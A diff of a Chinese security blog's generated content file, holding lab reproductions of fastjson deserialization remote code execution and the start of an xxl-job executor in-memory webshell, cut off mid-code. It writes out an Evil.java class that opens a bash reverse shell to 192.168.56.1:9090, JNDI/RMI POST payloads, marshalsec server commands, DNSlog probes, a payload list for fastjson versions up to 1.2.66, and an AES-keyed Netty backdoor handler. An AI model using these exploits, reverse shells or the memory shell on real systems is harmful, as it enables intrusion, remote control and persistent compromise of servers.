+<h3 id="DNSlog-测试"><a href="#DNSlog-测试" class="headerlink" title="DNSlog 测试"></a>DNSlog 测试</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;v5guyp.dnslog.cn&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144158.png" alt="image-20210901144126030"></p>
+<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>使用 <code>nc</code> 监听得到反弹shell</p>
+<blockquote>
+<h4 id="Evil-java"><a href="#Evil-java" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144529.png" alt="image-20210901152322290" style="zoom:80%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144092.png" alt="image-20210901152340189"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144433.png" alt="image-20210901143418464" style="zoom:80%;" />
+
+
+
+<h3 id="fastjson-rce-tool"><a href="#fastjson-rce-tool" class="headerlink" title="fastjson_rce_tool"></a><a href="https://github.com/wyzxxz/fastjson_rce_tool">fastjson_rce_tool</a></h3><p>使用  <code>fastjson_rce_tool</code> 快速getshell</p>
+<p><a href="https://github.com/wyzxxz/fastjson_rce_tool">https://github.com/wyzxxz/fastjson_rce_tool</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.56.1 8888  &quot;bash=bash -i &gt;&amp;/dev/tcp/192.168.56.1/9090 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145473.png" alt="image-20210901151615763" style="zoom:80%;" />
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 129</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;: &quot;rmi://192.168.56.1:8888/Object&quot;,</span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312144374.png" alt="image-20210901152003880" style="zoom:80%;" />
 
 
 
 
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p>
-<p><a href="https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html">https://thinkycx.me/2019-05-23-CVE-2019-5736-docker-escape-recurrence.html</a></p>
-<p><a href="https://saucer-man.com/information_security/547.html">https://saucer-man.com/information_security/547.html</a></p>
-<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><ul>
-<li><a href="https://github.com/q3k/cve-2019-5736-poc">https://github.com/q3k/cve-2019-5736-poc</a></li>
-<li><a href="https://github.com/twistlock/RunC-CVE-2019-5736">https://github.com/twistlock/RunC-CVE-2019-5736</a></li>
-</ul>
+
+<h2 id="fastjson-1-2-47-rce"><a href="#fastjson-1-2-47-rce" class="headerlink" title="fastjson&#x2F;1.2.47-rce"></a>fastjson&#x2F;1.2.47-rce</h2><p>目标环境是<code>openjdk:8u102</code>，这个版本没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以简单利用RMI进行命令执行。</p>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用 <code>vulhub</code> 搭建 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145045.png" alt="image-20210901185209143"></p>
+<h3 id="GetShell-1"><a href="#GetShell-1" class="headerlink" title="GetShell"></a>GetShell</h3><p>使用 <code>nc</code> 监听得到反弹shell</p>
+<blockquote>
+<h4 id="Evil-java-1"><a href="#Evil-java-1" class="headerlink" title="Evil.java"></a>Evil.java</h4></blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac Evil.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;/bin/bash&quot;</span><span class="punctuation">,</span> <span class="string">&quot;-c&quot;</span><span class="punctuation">,</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.1/9090 0&gt;&amp;1 &amp;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 192.168.56.1:8090</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 157</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.56.1:9999/Evil&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145880.png" alt="image-20210901152322290" style="zoom:80%;" />
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312156180.png" alt="image-20210901152340189"></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.56.1:8989/#Evil&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server --bind 192.168.56.1 8989</span><br></pre></td></tr></table></figure>
+
+ <img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145814.png" alt="image-20210901143418464" style="zoom:80%;" />
+
+
+
+<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><h3 id="未知目标是否使用-Fastjson-，但站点有原始报错回显"><a href="#未知目标是否使用-Fastjson-，但站点有原始报错回显" class="headerlink" title="未知目标是否使用 Fastjson ，但站点有原始报错回显"></a><strong>未知目标是否使用 Fastjson ，但站点有原始报错回显</strong></h3><p>如果站点有原始报错回显，可以用不闭合花括号的方式进行报错回显，报错中往往会有fastjson的字样</p>
+<p>例如</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145526.png" alt="image-20200704162617071"></p>
+<h3 id="无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson"><a href="#无回显，通过DNS回显的方式盲区分-Fastjson-和-Jackson" class="headerlink" title="无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson"></a><strong>无回显，通过DNS回显的方式盲区分 Fastjson 和 Jackson</strong></h3><p>我使用以下payload测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;745shj.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312145278.png" alt="image-20200704162844047"></p>
+<p>最终收到dnslog</p>
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146617.png" alt="image-20200704162922529"></p>
+<h3 id="最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson"><a href="#最新版本1-2-67依然可以通过dnslog判断后端是否使用fastjson" class="headerlink" title="最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson"></a>最新版本1.2.67依然可以通过dnslog判断后端是否使用fastjson</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>畸形的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/syyu6/Images/img/202112312146104.png" alt="img"></p>
+<p>POC:</p>
+<p>要嵌套在里面zeo里面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0</span><br></pre></td></tr></table></figure>
+
+<h2 id="多版本payload集合"><a href="#多版本payload集合" class="headerlink" title="多版本payload集合"></a>多版本payload集合</h2><p>影响版本：</p>
+<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1099/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-1"><a href="#fastjson-1" class="headerlink" title="fastjson&lt;&#x3D;1.2.41"></a>fastjson&lt;&#x3D;1.2.41</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://x.x.x.x:1098/jndi&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-2"><a href="#fastjson-2" class="headerlink" title="fastjson&lt;&#x3D;1.2.42"></a>fastjson&lt;&#x3D;1.2.42</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-3"><a href="#fastjson-3" class="headerlink" title="fastjson&lt;&#x3D;1.2.43"></a>fastjson&lt;&#x3D;1.2.43</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;[&#123;,&quot;dataSourceName&quot;:&quot;ldap://localhost:1399/Exploit&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-4"><a href="#fastjson-4" class="headerlink" title="fastjson&lt;&#x3D;1.2.45"></a>fastjson&lt;&#x3D;1.2.45</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;,&quot;properties&quot;:&#123;&quot;data_source&quot;:&quot;ldap://localhost:1399/Exploit&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-5"><a href="#fastjson-5" class="headerlink" title="fastjson&lt;&#x3D;1.2.47"></a>fastjson&lt;&#x3D;1.2.47</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.Class&quot;, </span><br><span class="line">        &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;, </span><br><span class="line">    &quot;b&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, </span><br><span class="line">        &quot;dataSourceName&quot;: &quot;ldap://x.x.x.x:1999/Exploit&quot;, </span><br><span class="line">        &quot;autoCommit&quot;: true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-6"><a href="#fastjson-6" class="headerlink" title="fastjson&lt;&#x3D;1.2.62"></a>fastjson&lt;&#x3D;1.2.62</h3><p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;rmi://127.0.0.1:1098/exploit&quot;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>影响版本：</p>
+<h3 id="fastjson-7"><a href="#fastjson-7" class="headerlink" title="fastjson&lt;&#x3D;1.2.66"></a>fastjson&lt;&#x3D;1.2.66</h3><p>前提：<br>autoTypeSupport属性为true才能使用。（fastjson&gt;&#x3D;1.2.25默认为false）</p>
+<p>exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,&quot;resourceName&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&quot;,&quot;jndiNames&quot;:&quot;ldap://192.168.80.1:1389/Calc&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;,&quot;properties&quot;: &#123;&quot;@type&quot;:&quot;java.util.Properties&quot;,&quot;UserTransacti</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>网络安全</category>
@@ -1182,6 +916,21 @@
       <tags>
         <tag>网络安全</tag>
         <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>xxl-job-executor内存马</title>
+    <url>/articles/4ac9859d/</url>
+    <content><![CDATA[<h2 id="2-2-0"><a href="#2-2-0" class="headerlink" title="2.2.0"></a>2.2.0</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.executor.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.ExecutorBiz;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.impl.ExecutorBizImpl;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.server.EmbedServer;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.http.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.timeout.IdleStateHandler;</span><br><span class="line"><span class="keyword">import</span> io.netty.util.CharsetUtil;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.log.XxlJobLogger;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.model.ReturnT;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyThreadHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelDuplexHandler</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5str(pass + xc);</span><br><span class="line">        <span class="keyword">private</span> Class <span class="title function_">defClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>],Thread.currentThread().getContextClassLoader());</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> (Class) method.invoke(urlClassLoader,classbytes,<span class="number">0</span>,classbytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">md5str</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.MessageDigest m;</span><br><span class="line">                m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">                ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ThreadLocal&lt;AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt;&gt; requestThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span>   Class payload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> HttpRequest)&#123;</span><br><span class="line">                <span class="type">HttpRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpRequest) msg;</span><br><span class="line">                